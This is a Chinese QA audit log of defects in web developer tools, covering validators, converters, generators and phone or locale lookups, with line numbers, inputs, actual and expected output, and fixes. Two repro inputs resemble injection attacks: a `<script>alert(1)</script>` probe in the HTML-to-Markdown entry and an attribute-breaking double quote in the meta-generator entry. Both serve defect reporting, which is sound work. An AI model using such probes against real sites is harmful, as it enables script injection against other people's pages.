### IT-N400 `type` 联合数组永远通过；`in` 运算符走原型链使 `toString`/`constructor` 绕过必填与额外字段检查（中，确认缺陷）
- 页面：`tools/it/json-schema-validator.html`
- 问题：① `typeOK` 用 `schemaType === 'string'` 等逐字符串比较（`:248-257`），`type:["string","number"]` 是数组，所有比较为 false，函数落到 `return true`；② required/properties/additionalProperties 用 `k in val` / `k in props`（`:274`、`:279`、`:286`），会命中 `Object.prototype`，`{}` 被判定「含有 toString/constructor」。
- 行号：`:248-257`、`:274`、`:279`、`:286`
- 复现：schema `{"type":["string","number"]}` + data `{}` → 实际「校验通过 ✅」，期望「类型不匹配」；schema `{"type":"object","required":["constructor"]}` + data `{}` → 实际「通过」，期望「缺少必填字段 root.constructor」；data 仅多出 `toString` 时 `additionalProperties:false` 也不报。
- 影响：联合类型与含这类键名的对象校验结果错误，且是静默放过。
- 方案：`type` 支持数组（任一匹配即通过）；所有成员判断改用 `Object.prototype.hasOwnProperty.call(...)`。
- 假工具：否

### IT-N401 strong/em 完全不处理，默认示例的加粗内容在 Markdown 中丢失（高，承诺未实现）
- 页面：`tools/it/html-to-markdown.html`
- 问题：说明区明确承诺 `strong/b → **`、`em/i → _`（`:123`），但 `nodeToMarkdown` 没有 STRONG/EM 分支，落到默认 `innerMarkdown`；且 P 用 `innerText` 取纯文本（`:248`），行内标签信息被彻底抹掉。
- 行号：`:123`、`:248`、`:306-309`（无 STRONG/EM 分支）
- 复现（默认示例首屏）：`<p>支持 <strong>HTML 转 Markdown</strong>，保留标题、列表与链接。</p>` → 实际 `支持 HTML 转 Markdown，保留标题、列表与链接。`；期望 `支持 **HTML 转 Markdown**，保留标题、列表与链接。`
- 影响：默认输入即丢失加粗/斜体，标题、表格单元格内的行内格式同样丢失，转换结果与承诺不符。
- 方案：增加 STRONG/EM 分支；P/H/TABLE 单元格改为对子节点递归（而非 `innerText`）。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N402 转义函数 `escapeMarkdown` 定义后从未调用，`*` `_` `[` 等原样输出（中，承诺未实现）
- 页面：`tools/it/html-to-markdown.html`
- 问题：`:223` 定义了 `escapeMarkdown`，全文件再无调用点（grep 仅 1 处）；注意事项仍写「内容中的 `*` `_` `[` `]` 等需转义」（`:126`）。
- 行号：`:223`（定义）、`:126`（承诺）
- 复现：`<p>2 * 3 * 4</p>` → 实际 `2 * 3 * 4`，在 Markdown 中渲染成斜体；期望 `2 \* 3 \* 4`。
- 影响：含运算符、Markdown 元字符的正文被渲染错乱，行内代码外的文本不可信。
- 方案：在文本节点输出与表格单元格处调用 `escapeMarkdown`（保留代码块/行内码内部原文）。
- 假工具：否（承诺未实现）

### IT-N403 `<br>` 换行与嵌套列表层级被折叠成空格（中，确认缺陷）
- 页面：`tools/it/html-to-markdown.html`
- 问题：① BR 分支先返回 `'\n'`（`:240`），后一个返回 `'  \n'` 的分支（`:254`）永远不可达；P 又用 `innerText`（`:248`），浏览器把 `a<br>b` 的换行折叠成空格，最终输出 `a b`；② 列表项 `body.replace(/\n+/g, ' ')`（`:290`）把子列表换行压平，嵌套层级丢失。
- 行号：`:240`、`:248`、`:254`、`:289-290`
- 复现：`<p>a<br>b</p>` → 实际 `a b`，期望 `a  \nb`（两个空格硬换行）；`<ul><li>a<ul><li>b</li></ul></li></ul>` → 实际 `- a - b`，期望 `- a` 换行后缩进 `  - b`。
- 影响：多行段落和嵌套列表（README、文档转换最常见结构）被压成单行，语义丢失。
- 方案：BR 统一输出 `  \n`；P 递归处理子节点；列表项保留内部换行并缩进，去掉 `replace(/\n+/g,' ')`。
- 假工具：否

### IT-N404 `<script>`/`<style>` 文本未丢弃，脚本源码被写进 Markdown（中，承诺未实现）
- 页面：`tools/it/html-to-markdown.html`
- 问题：`nodeToMarkdown` 对 SCRIPT/STYLE 落到默认 `return innerMarkdown(node, depth)`（`:309`），其文本子节点被原样输出；注意事项却写「class、style、脚本等表现层信息会被丢弃」（`:125`）。
- 行号：`:306-309`、`:125`
- 复现：`<p>x</p><script>alert(1)</script>` → 实际 `x` + 空行 + `alert(1)`；期望 `x`（脚本整段丢弃）。
- 影响：粘贴整段 HTML 片段时脚本代码混入 Markdown，既污染文档也可能被后续渲染器误执行。
- 方案：在 `nodeToMarkdown` 对 `SCRIPT`、`STYLE`、`NOSCRIPT` 直接返回空串。
- 假工具：否（承诺未实现）

### IT-N405 辅助平面字符只输出高代理项，UTF-16 转义不完整（中，确认缺陷）
- 页面：`tools/it/text-to-unicode.html`
- 问题：逐字符用 `Array.from` 按码点迭代（正确），但 UTF-16 转义只取 `c.charCodeAt(0)`（`:225`）；对 `🚀`（U+1F680）只得高代理 `D83D`，低代理 `DE80` 丢失，输出非法孤立代理转义。页面说明还写「辅助平面字符需代理对（两个 \u 序列）」。
- 行号：`:222-227`（`:225`）、`:159`
- 复现（node 复刻）：默认输入 `你好 ToolBox 🚀` → 实际该行 UTF-16 列为 `\uD83D`；期望 `\uD83D\uDE80`。`U+1F600` 等 emoji 同样只出一半。
- 影响：默认示例即出现错误转义，用户据此写出的字符串无法还原 emoji。
- 方案：`cp > 0xFFFF` 时按代理对公式输出两个 `\uXXXX`，或直接用 `c.codePointAt(0)` 判断后拆高低代理。
- 假工具：否

### IT-N406 MIME 子类型被直接当文件扩展名，`text/plain`→`.plain`、`image/svg+xml`→`.svg+xml`（中，确认缺陷）
- 页面：`tools/it/base64-file.html`
- 问题：还原下载的文件名取 `mime.split('/')[1]` 作为扩展名（`:323`；未选文件时 `:303` 同理），没有常见 MIME→扩展名映射；`+xml`、`vnd.*` 等子类型也不清洗。
- 行号：`:303`、`:323`（说明 `:115` 写「以 decoded. 加类型后缀」）
- 复现：输入 `data:text/plain;base64,SGVsbG8=` → 实际下载 `decoded.plain`，期望 `decoded.txt`；`data:image/svg+xml;base64,...` → 实际 `decoded.svg+xml`，期望 `decoded.svg`；`application/json` 虽得 `.json` 但依赖子类型恰好等于扩展名。
- 影响：还原出的文件扩展名错误，双击无法用预期程序打开；Office/XML 类型尤其明显。
- 方案：维护常见 MIME→扩展名映射（text/plain→txt、image/jpeg→jpg、image/svg+xml→svg、application/vnd.openxmlformats-*→docx/xlsx 等），未知类型再回退 `bin`。
- 假工具：否

### 覆盖清单（U 批 IT 转换/编码）
- `json-to-code`：IT-N379（高）、IT-N380（高）、IT-N381（高）、IT-N382、IT-N383、IT-N384（中）。
- `toml-to-json`：IT-N385（高）、IT-N386、IT-N387（中）。
- `yaml-to-toml`：IT-N388（高）、IT-N389、IT-N390（中）；缩进控件并入 IT-N391。
- `toml-to-xml`：IT-N392、IT-N393（中）；无高优缺陷（核心 TOML→XML 主路径可跑通，问题集中在导出转义与非法元素名）。
- `xml-to-toml`：IT-N394、IT-N395（中）；无高优缺陷。
- `json-diff`：IT-N396、IT-N397（中）；无高优缺陷（按索引与逐行的差异计算本身正确）。
- `json-schema-validator`：IT-N398（高）、IT-N399、IT-N400（中）。
- `html-to-markdown`：IT-N401（高）、IT-N402、IT-N403、IT-N404（中）。
- `text-to-unicode`：IT-N405（中）；无高优缺陷（码点列与 BMP 字符正确，仅辅助平面转义缺失）。
- `base64-file`：IT-N406（中）；无高优缺陷（文件/文本互转主路径正确，仅下载扩展名错误）。
- 方法声明：本轮仅基于上述 10 页源码通读 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。

## U 批 · IT 查询/编码表（2026-11-04）

### IT-N407 UUID v1 时间字段写错，生成结果无法解码回当前时间（高，确认缺陷）
- 页面：`tools/it/uuid-generator.html`
- 问题：JS 位运算的移位数按 32 取模，`timestamp >>> 32` 实际等于「不移位」、`timestamp >>> 48` 实际等于 `>>> 16`，导致 time_mid / time_hi 写入的是低位而非 32–47 / 48–59 位（`:398-399`）；且 `Date.now()*10000+0x01b21dd213814000` ≈ 1.4×10¹⁷ 已超过 `Number.MAX_SAFE_INTEGER`，低位的 100ns 精度也被丢弃（`:396`）。
- 行号：`:396`、`:398`、`:399`、`:403-412`
- 复现（node 复刻 `generateUuidV1`）：生成 `053f1590-1590-153f-afed-889bd78351b2`，按 RFC 4122 取 time_low/time_mid/time_hi 拼回 100ns 时间戳得 `378044602029905296`（解出 **2780-10-05**），真实值为 `140130789953050000`（2026-11-04），相差约 754 年；再生成一次又会解到 4538 年——因为 time_mid 实际取的是低 32 位中的低 16 位，解码时间随当前毫秒的低位大幅跳动。同次实测 `t>>>32 = 88020368`（真值高 16 位应为 `55350`）、`t>>>48 = 1343`（真值 48–59 位应为 `497`）。期望：解码时间 ≈ 生成时刻。
- 影响：v1 的「时间戳 + 时序性」卖点完全失效，按 UUID 排序/做时间范围查询会得到荒谬结果；同一毫秒内生成的多条 v1 时间字段完全相同，只剩 clock_seq 随机。
- 方案：用 `BigInt` 或分段算术（`ms*10000` 拆高低位）+ `BigInt` 取位，避免 32 位移位与 2^53 精度问题；补一条「v1 可解码为当前时间」的回归用例。
- 假工具：否（核心实现错误）

### IT-N408 文案与结构化数据声称支持 v7，版本下拉无 v7（中，承诺未实现）
- 页面：`tools/it/uuid-generator.html`
- 问题：`<option>` 只有 v1/v4/v5（`:203-205`），但 JSON-LD 与工具简介都写「支持生成 v1、v4、v5、**v7** 版本 UUID」（`:62`、`:821`），页面「UUID 版本说明」的 FAQ 还专门讨论 v7 的时间戳泄露。
- 行号：`:62`、`:202-206`、`:821`
- 复现：打开「生成 UUID」标签查看「UUID 版本」下拉 → 实际仅 3 个选项；期望存在 v7（时间有序随机 UUID）。
- 影响：用户按简介/搜索结果找 v7 会扑空；结构化数据与页面能力不一致。
- 假工具：否（承诺未实现）

### IT-N409 v5 命名空间不做格式校验，非法输入静默产出「看似合法」的错误 UUID（中，确认缺陷）
- 页面：`tools/it/uuid-generator.html`
- 问题：`generateUuidV5` 直接 `uuidToBytes(namespace)`（`:417-419`），`uuidToBytes` 只用正则剔除非十六进制字符、不校验长度/结构（`:436-443`），非法输入不会报错。
- 行号：`:417-419`、`:436-443`
- 复现（node 复刻）：命名空间填 `abc`、名称 `example.com` → `uuidToBytes('abc')` 得 `[171,12,0,0,…]`（即把 `ab`、`0c` 当成 UUID 前两字节），仍返回一个格式合法的 v5 UUID；期望提示「命名空间 UUID 格式非法」。命名空间留空时同理（全 0 命名空间）。
- 影响：拼错命名空间后得到的 UUID 与团队约定的命名空间不一致，且无法从结果看出异常，幂等键会全部漂移。
- 方案：调用已有的 `isValidUuid(namespace)`，失败时在结果区报错并中止。
- 假工具：否

### IT-N410 邀请码批量生成无去重，短码+大批量会产出重复码（中，承诺未实现）
- 页面：`tools/it/invite-code-generator.html`
- 问题：原理框承诺「批量生成自动去重保证唯一」（`:159`），但 `generate()` 只是逐条随机拼接、直接 `html+=`（`:282-288`），全程无 Set/去重逻辑；最短码长 4、字符集可选「仅数字+排除易混」= 8 个字符。
- 行号：`:159`（承诺）、`:282-288`（实现）
- 复现（node 复刻 `randInt`+同字符集）：数量 30、长度 4、仅勾「数字」并保留「排除易混」→ 随机跑 1 万次，**971 次**（9.71%）出现重复，实测一批里出现两条 `6387`；期望 30 条互不相同。
- 影响：邀请码/白名单一旦重复，等于少发且可被重复核销；批量导入数据库前的「唯一」假设不成立。
- 方案：生成后用 `Set` 去重并补足数量（或达到尝试上限时报错）。
- 假工具：否（承诺未实现）

### IT-N411 「校验位（Luhn/CRC）」实为字符码求和取模，且无校验入口（中，承诺未实现）
- 页面：`tools/it/invite-code-generator.html`
- 问题：原理框写「可附加校验位（Luhn 变体或 CRC）以拦截错填」（`:159`），实现是 `sum += c.charCodeAt(0)` 后拼 `sum % 10`（`:285`）——只是模 10 加法校验，换位错误完全检不出；页面也没有任何「校验邀请码」的输入/按钮，所谓「拦截错填」无从使用。
- 行号：`:159`（承诺）、`:285`（实现）
- 复现（node 复刻）：`AB` 与 `BA` 的校验位都算出 `1`，无法区分换位；Luhn 对换位敏感、可检出。期望按承诺实现 Luhn/CRC，或把文案改成「简单求和校验位」并说明不检换位。
- 影响：用户以为能靠校验位发现录入错误，实际最常见的换位错误检测不到。
- 假工具：否（承诺未实现）

### IT-N412 手机号输入框用 `type="number"`，无法粘贴页面自己举例的「138-0013-8000」（高，确认缺陷）
- 页面：`tools/it/phone-parser.html`
- 问题：页面简介的核心承诺是「把用户粘贴的『138-0013-8000』这类乱序号码整理成标准格式」（`:101`），但输入框是 `type="number"`（`:116`）。按 HTML 规范，number 输入框的 value sanitization 会把非合法浮点数（含 `-`、`+`、`(`、`)`、空格）置为空串，因此 `:219` 的 `replace(/[^0-9]/g,'')` 根本拿不到这些字符。
- 行号：`:101`（承诺）、`:116`（控件）、`:219`（清洗）
- 复现：在输入框粘贴 `138-0013-8000` → 实际值被清空，结果区显示「请输入数字电话号码」；期望解析出 `138 0013 8000` / `+86 13800138000`。粘贴 `+86 138 0013 8000`、`(020) 7946 0958` 同样被清空。
- 影响：页面主打的「乱序号码整理」入口在真实粘贴场景下不可用。
- 方案：改 `type="text"` + `inputmode="tel"`，保留现有数字清洗。
- 假工具：否

### IT-N413 国内格式对所有国家都用 4-4 分组，美国号码显示成「20 2555 0123」（中，确认缺陷）
- 页面：`tools/it/phone-parser.html`
- 问题：`grp()` 从右往左每 4 位切一段（`:223`），与所选国家无关；页面却承诺「国际格式按国家分组规则展示」（`:108`）、「按目标格式重新分组排版」（`:107`）。
- 行号：`:107-108`（承诺）、`:223-224`（实现）
- 复现（node 复刻 `grp`）：选「美国/加拿大 +1」输入 `2025550123` → 实际 `20 2555 0123`；期望 NANP 风格 `(202) 555-0123`。选 `+44` 输入 `0794609584` → 实际 `07 9460 9584`，期望 `07946 09584`。
- 影响：分组与所选国家无关，除个别长度恰好凑成 3-4-4 的号码（如中国 11 位手机号）外，多数国家的显示都不符合当地习惯，用户会误判号码是否写错。
- 假工具：否

### IT-N414 不识别国家码、不剥前导 0、不校验 15 位上限，「解析」实为字符串拼接（中，假工具）
- 页面：`tools/it/phone-parser.html`
- 问题：原理框写「E.164 国际格式 = + 国家/地区代码 + 清洗后数字」「识别国家码、区号与本地号码」（`:103`、`:107`），实现只有 `'+'+cc+digits`（`:221`），从未尝试识别输入中已有的国家码、不剥离国内号码首位 0、不检查 E.164 的 15 位上限。
- 行号：`:103`、`:107`（承诺）、`:217-229`（实现，核心 `:221`）
- 复现：① `phone=8613800138000`、`cc=86` → 实际 `+868613800138000`，期望 `+8613800138000`；② `phone=02079460958`、`cc=44` → 实际 `+4402079460958`（16 位），期望 `+442079460958`；③ `phone` 填 20 位数字 → 实际输出 22 位「E.164」，期望超出 15 位时报错。
- 影响：用户按「解析器」直觉粘贴完整国际号码会得到双国家码的错误结果，且该结果看起来像正常 E.164。
- 假工具：**是**（核心「解析」未实现，仅拼接+分组）

### IT-N415 MSISDN 非 11 位国内号码一律判「✅ MSISDN 格式有效」（高，确认缺陷）
- 页面：`tools/it/msisdn-lookup.html`
- 问题：校验只覆盖 `cc==='86' && nationalNum.length===11` 与 `cc==='1' && length===10` 两个分支，其余全部落到 `else` 直接输出「✅ MSISDN 格式有效」（`:311-313`），既不校验各国号码长度，也不校验 E.164 的 15 位上限。
- 行号：`:287`、`:311-313`
- 复现（node 复刻 `validate`）：`+86 1` → 实际「国家代码 +86 中国｜✅ MSISDN 格式有效」；`+86 138001380000`（12 位）同样有效；输入 22 位数字也有效。期望分别提示「号码长度非法」/「超过 E.164 上限 15 位」。
- 影响：把明显无效的号码当成可用 MSISDN 入库/发短信，错误直接进入下游。
- 假工具：否（校验错误）

### IT-N416 国家码库仅 42 条且缺 852/886，香港/台湾号码直接「无法识别国家代码」（高，确认缺陷）
- 页面：`tools/it/msisdn-lookup.html`
- 问题：`CC_DB` 只有 42 个国家/地区码（`:243-251`），缺少 `852`（香港）、`886`（台湾）、`853`（澳门）、`880`（孟加拉）、`966`（沙特）等常见码；3→1 位前缀匹配失败即报错。
- 行号：`:243-251`（库）、`:274-281`（匹配与报错）
- 复现（node 复刻）：`+852 91234567` → 实际「❌ 无法识别国家代码（请输入完整国际号码，如 +86...）」；期望「+852 中国香港，国内号码 91234567」。`+886 912345678` 同样报错。
- 影响：港台用户完全无法使用；而本站其他工具（如 phone-parser）明确支持 +852/+886，口径不一致。
- 假工具：否（数据缺口导致功能失败）

### IT-N417 运营商表缺 xxxx0 号段，默认示例 13800138000 显示「未知」而非「移动」（中，确认缺陷）
- 页面：`tools/it/msisdn-lookup.html`
- 问题：查表键为「8613」+ 国内号码第 4 位（`:288-296`），但 `OP_DB['8613']` 只有 `1`–`9`，缺 `0`（`:253`）；`8619` 也缺 `0/2/4/6/7`。138 号段属中国移动，而 1380xxxxxxx 是最典型的号段。
- 行号：`:252-260`（表）、`:288-297`（查表）
- 复现（node 复刻）：默认输入 `+86 13800138000` → 实际「运营商：未知（号段 1380）」；期望「移动」。
- 影响：页面默认状态就给出错误的运营商归属；后续号段判断同理大量落空。
- 假工具：否

### IT-N418 区号不在表中仍判「✅ 标准 10 位 NANP 号码」（高，确认缺陷）
- 页面：`tools/it/area-code-lookup.html`
- 问题：只要数字位数恰好 10 位就无条件输出 `✅ 标准 10 位 NANP 号码`（`:351-354`），完全没有使用前面已算出的 `AREA_CODES[areaCode]` 结果；NPA 首位 2–9、N11 冲突等规则也未校验。
- 行号：`:343-346`、`:351-354`
- 复现（node 复刻）：输入 `9995550100` → 实际「区号：999｜地区：未知/非 NANP 区号｜✅ 标准 10 位 NANP 号码」；期望 ❌（999 不是已分配的 NANP 区号）。输入 `0005550100`、`1115550100` 同样被判标准。
- 影响：校验结论与地区查询自相矛盾，用户会把无效号码当成合法号码。
- 假工具：否（校验错误）

### IT-N419 带国家码 `+1` 的号码被当成区号 `121`，解析错位（中，确认缺陷）
- 页面：`tools/it/area-code-lookup.html`
- 问题：先 `replace(/\D/g,'')` 保留全部数字（`:334`），再取前 3 位当区号（`:343`），没有剥离 NANP 国家码前导 `1`。
- 行号：`:334`、`:343-344`
- 复现（node 复刻）：输入 `+1 212-555-0100`（或 `1 212 555 0100`）→ digits=`12125550100`（11 位）→ 实际「区号：121｜地区：未知/非 NANP 区号｜⚠️ 通常为 10 位」；期望剥离前导 1，区号 212 → New York，格式化 `(212) 555-0100`。
- 影响：用户从通讯录/短信里粘贴完整国际号码时结果全错，却提示「位数不对」误导排查方向。
- 假工具：否

### IT-N420 表内 `456` 标为 Reserved，仍输出「✅ 区号有效」（中，确认缺陷）
- 页面：`tools/it/area-code-lookup.html`
- 问题：`AREA_CODES` 收录 `'456':'Reserved'`（`:272`），而 3 位输入的有效性判断只做 `AREA_CODES[areaCode]` 存在性检查（`:359-360`），于是保留/未分配码被当成有效区号。
- 行号：`:272`、`:359-360`
- 复现（node 复刻）：输入 `456` → 实际「地区：Reserved｜✅ 区号有效」；期望 ❌（456 为 NANP 保留、未分配为地理区号）。
- 影响：区号有效性结论错误；同类「Reserved」条目若再加入也会一并误判。
- 假工具：否

### IT-N421 BCP 47 合法写法被正则判非法（variant / 数字地区 / 扩展）（中，确认缺陷）
- 页面：`tools/it/locale-lookup.html`
- 问题：兜底正则为 `^[a-z]{2,3}(-[A-Z][a-z]{3})?(-[A-Z]{2})?(-[A-Z0-9]{5,8})?$`（`:322`），限定 variant 必须 5–8 位、region 必须两位字母、且不支持扩展子标签；RFC 5646 允许 4 位数字 variant、3 位数字 UN M.49 地区与 `-u-` 等扩展。
- 行号：`:322`
- 复现（node 复刻同一正则）：`de-DE-1996` → 实际「❌ 不符合 BCP 47 格式」；期望 ✅（1996 为合法 variant）。`es-419` → 实际 ❌；期望 ✅（419 为拉美地区码）。
- 影响：把合法标签判成非法，用户会据此改写配置，反而写出不规范的 locale。
- 假工具：否

### IT-N422 locale 精确查表区分大小写且缺规范标签，`EN-US` / `zh-Hans-CN` 只报「无此条目」（中，确认缺陷）
- 页面：`tools/it/locale-lookup.html`
- 问题：查找用 `LOCALES[raw] || LOCALES[raw.replace('_','-')]`（`:312`）原样比对，不做大小写与 canonical 化；表内只有 49 条且没有 `zh-Hans-CN` / `zh-Hant-TW` 这类「语言-文字-地区」组合（`:245-293`，仅有 `zh-Hans`）。
- 行号：`:152`（承诺「库未收录时按…正则校验」）、`:245-293`、`:312`
- 复现（node 复刻同一查表）：`EN-US` → 实际「✅ BCP 47 格式有效（数据库中无此条目）」；期望完整输出「英语（美国）/ Latn」。`en_us` 同样漏查。`zh-Hans-CN`（deep-dive FAQ 正以此为规范示例）也只能得到「无此条目」。
- 影响：大小写/下划线是用户常见输入，结果从「完整信息」退化为「仅格式有效」，等于查不到。
- 方案：先 `toLowerCase()` 规范化再查，并对 `language-script-region` 做逐级回退（zh-Hans-CN → zh-Hans → zh）。
- 假工具：否

### IT-N423 国家代码表仅 62 条，冰岛/卢森堡/柬埔寨等常见国家查不到（中，确认缺陷）
- 页面：`tools/it/country-code-lookup.html`
- 问题：`COUNTRIES` 仅收录 62 个 ISO 3166-1 alpha-2 条目（`:234-297`），而标准共 249 个；未命中即输出「❌ 未找到匹配的国家」（`:317-319`），也不支持 `UK`/`USA` 这类常见别名。
- 行号：`:234-297`、`:302-315`、`:317-319`
- 复现：输入 `IS` → 实际「❌ 未找到匹配的国家」；期望 Iceland / `+354` / ISK。实测 `LU`、`EE`、`SK`、`SI`、`KH`、`MM`、`NP` 均无条目；`UK`、`USA` 也查不到。
- 影响：作为「国家代码查询」工具覆盖面不足四分之一，常见查询直接失败。
- 假工具：否（数据缺口）

### IT-N424 语言查询不接受带地区的 BCP 47 标签，`zh-CN`/`en-US` 报「未找到」（中，确认缺陷）
- 页面：`tools/it/language-code-lookup.html`
- 问题：只做「两字母代码精确匹配」或「中文名/英文名/ISO 639-3」子串匹配（`:296-307`），没有拆分 `language[-Script][-REGION]`；输入带地区标签时三段条件都不成立。
- 行号：`:296-307`
- 复现（node 复刻）：输入 `zh-CN` → 实际「❌ 未找到匹配的语言」；期望 中文 / `zh` / `zho`。`en-US`、`pt-BR` 同样未找到，而工具正文与 FAQ 正以 `zh-CN`、`zh-CN vs zh` 为主要讨论对象。
- 影响：最常见的输入形式直接失败，用户被迫手改成两字母码才知道结果。
- 假工具：否

### IT-N425 keycode 页全局 `preventDefault`，Tab/空格/方向键默认行为被吞（中，确认缺陷）
- 页面：`tools/it/keycode-info.html`
- 问题：`window` 的 `keydown` 监听在除「事件目标是 BUTTON」外的所有情况都 `e.preventDefault()`（`:286-287`）；`:275` 的 `if(e.key==='F12'){}` 是空分支，注释写「允许默认」但随后仍会执行 `preventDefault`。
- 行号：`:274-288`（核心 `:275`、`:286-287`）
- 复现：页面加载后（焦点不在按钮上）按空格或方向键 → 页面不滚动；连续按 Tab → 焦点停在链接后不再前进；期望保留滚动与焦点切换等默认行为，仅展示按键信息。
- 影响：键盘/读屏用户无法正常浏览页面；对一个「开发者调试」工具而言，拦截 F12 的意图也未实现。
- 方案：只在确实需要阻止的按键上 `preventDefault`，或干脆不阻止（本页无输入控件，无需拦截）。
- 假工具：否

### IT-N426 随机端口：实现取 1024–65535 且不检测占用，与「49152–65535 / 未被占用」的说法矛盾（中，承诺未实现）
- 页面：`tools/it/random-port-generator.html`
- 问题：实现为 `1024 + rnd[0] % (65535-1024+1)`（`:278`），即整个注册段+动态段；但原理说明写「生成未被占用的随机端口号」（`:112`），建议「从动态端口段选取」（`:115`），FAQ 更明确写「按 IANA 规定从动态/私有端口范围（49152–65535）中随机取值」（`:174`）。
- 行号：`:108`、`:112`、`:114-115`、`:174`（说法）、`:278`（实现）
- 复现：生成 20 个端口 → 实际取值范围 1024–65535（含 1024–49151 注册段，可能抽到 3000/3306/8080 这类常用端口）；期望按 FAQ 说法只取 49152–65535。且浏览器无法探测占用，「未被占用」不可能保证。期望文案统一为「1024–65535，不保证未被占用」（或改实现范围）。
- 影响：用户按 FAQ 以为拿到的端口更安全，实际拿到注册段端口，冲突概率更高。
- 假工具：否（承诺未实现）

### IT-N427 NANP 分支只认 10 个区号，未知区号仍判「✅ MSISDN 有效」（中，确认缺陷）
- 页面：`tools/it/msisdn-lookup.html`
- 问题：`+1` 且 10 位的分支里 `AC_DB` 只有 212/310/415/206/617/312/404/713/214/305 十个区号（`:307`），未命中时输出「未知城市」，但随后仍无条件追加「✅ NANP 号码」「✅ MSISDN 有效」（`:308-310`）。
- 行号：`:305-310`
- 复现（node 复刻）：`+1 9995550100` → 实际「区号：999 - 未知城市｜号码类型：✅ NANP 号码｜✅ MSISDN 有效」；期望 ❌（999 不是已分配的 NPA）。`+1 2025550100`（华盛顿特区）→ 实际「未知城市」；期望 Washington, DC。
- 影响：绝大多数真实美国号码都查不到归属地，且无效区号也照样通过校验，结论形同虚设。
- 假工具：否

### 覆盖清单（U 批 IT 查询/编码表）
- `uuid-generator`：IT-N407（高）、IT-N408、IT-N409（中）。
- `invite-code-generator`：IT-N410、IT-N411（中）；无高优缺陷。
- `random-port-generator`：IT-N426（中）；无高优缺陷（端口取值与去重逻辑本身正确）。
- `phone-parser`：IT-N412（高）、IT-N413、IT-N414（中，假工具）。
- `msisdn-lookup`：IT-N415、IT-N416（高）、IT-N417、IT-N427（中）。
- `locale-lookup`：IT-N421、IT-N422（中）；无高优缺陷。
- `language-code-lookup`：IT-N424（中）；无高优缺陷（两字母码/中英文名/639-3 主路径正确）。
- `area-code-lookup`：IT-N418（高）、IT-N419、IT-N420（中）。
- `country-code-lookup`：IT-N423（中）；无高优缺陷（已收录条目的字段本身正确）。
- `keycode-info`：IT-N425（中）；无高优缺陷（key/code/keyCode 展示与速查表数值均正确）。
- 方法声明：本轮仅通读上述 10 页源码 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N412 的输入框行为依据 HTML 规范的 number value sanitization 判定，未做真机粘贴验证。

## V 批 · IT 生成/校验/计算（2026-11-04）

### IT-N428 meta 生成器的 twitter:title / twitter:description 写死为本站文案，完全忽略用户输入（高，假功能）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`calcTool` 里 og:title / og:description 用的是用户输入 `t` / `d`（`:230-231`），但 twitter 卡两行直接拼了本工具自己的标题与简介常量（`:236-237`），与输入的 `t`、`d` 无关。原理说明还写着「社交：……以及 Twitter Card 的 twitter:card 等」（`:105`），暗示按输入生成。
- 行号：`:227-238`（核心 `:236`、`:237`）
- 复现：`title=我的站点`、`description=这是站点描述`、`url=https://example.com/` → 实际输出 `twitter:title="Meta 标签生成器 - 免费在线开发工具"`、`twitter:description="Meta 标签生成器是一款免费的在线IT 开发工具，……"`；期望 `twitter:title="我的站点"`、`twitter:description="这是站点描述"`。
- 影响：用户复制整段 meta 后，Twitter/X 分享卡片显示的是本工具的名字与简介，与其站点无关；且 twitter:description 里还有重复两遍的套话。
- 方案：改为 `'<meta name="twitter:title" content="'+t+'">'`、`…content="'+d+'">'`，与 og 两行同源。
- 假工具：否（核心输出错误）

### IT-N429 说明把 viewport 列为「必需」，生成结果却完全没有 viewport / charset / robots / keywords（中，承诺未实现）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：原理框列出「基础」五项含 keywords、viewport、robots、charset（`:104`），并强调「viewport 是移动端正确适配的前提，缺失会触发桌面版缩放」（`:107`）；但 `calcTool` 只输出 `<title>`、`description`、`og:*`、`twitter:*`（`:228-238`），页面也没有这些字段的输入控件。
- 行号：`:104-107`（说法）、`:223-238`（实现）
- 复现：输入 `title=T`、`description=D`、`url=https://example.com/` → 实际输出 9 行，无 `<meta name="viewport">`、无 `<meta charset>`、无 `robots`、无 `keywords`；期望至少输出 `viewport`（或明确标注「不含 viewport」，由用户自加）。
- 影响：工具名叫「Meta 标签生成器」、说明也称「生成完整 meta 片段」，但用户把结果贴进 `<head>` 后移动端仍走桌面缩放，必须自己补标签。
- 假工具：否（功能缺口）

### IT-N430 用户输入里的双引号未转义，复制出的 meta 标签属性被提前闭合（中，确认缺陷）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`escH` 走 `div.textContent → innerHTML`（`:221`），HTML 文本节点序列化只转义 `& < >`，不转义 `"`；随后把整段字符串塞进 `<pre>` 展示（`:229-231` 的 `content="'+d+'"`）。用户据此复制粘贴得到的是原始双引号。同一行末的 `replace(/Infinity|NaN/g,'—')` 还会把用户文本里的 `NaN` / `Infinity` 字样改写为「—」。
- 行号：`:221`、`:228-234`、`:236-237`
- 复现：`description=He said "hi"` → 实际展示并可复制 `<meta name="description" content="He said "hi"">`，粘贴后属性在 `He said ` 处闭合，description 被截成 `He said `；期望 `content="He said &quot;hi&quot;"`。另：`title=NaN` → 实际显示 `—`。
- 影响：description/og/twitter 任一字段含引号（常见于引用型文案、含英寸/尺寸的文案）都会产出坏 HTML，页面本身不报错，难以发现。
- 方案：拼装时对字段单独做 `&quot;` 转义（或在 `escH` 里补 `"`/`'`），并把 NaN/Infinity 兜底只施加于数值结果、不施加到用户文本。
- 假工具：否

### IT-N431 CSS 压缩在引号字符串内照常删空白与 `: ; , > }`，合法 CSS 被静默改义（高，确认缺陷）
- 页面：`tools/it/css-minify.html`
- 问题：`minify` 是 4 条全局正则（`:216-221`），不区分字符串/`url()`：`\s*([{}:;,>])\s*`（`:219`）会把 `content:"a: b"` 里的 `:` 后空格删掉，`\s+/g→' '`（`:218`）把字符串内连续空格压成一个，`;\}`（`:220`）把字符串内的 `;}` 也删掉。页面却承诺「压缩仅去注释与空白，不改变选择器与声明语义」（`:168`），只是在 `:176` 含糊提了一句 content 特殊空格。
- 行号：`:216-221`（核心 `:218-220`）、`:168`、`:176`、`:224`
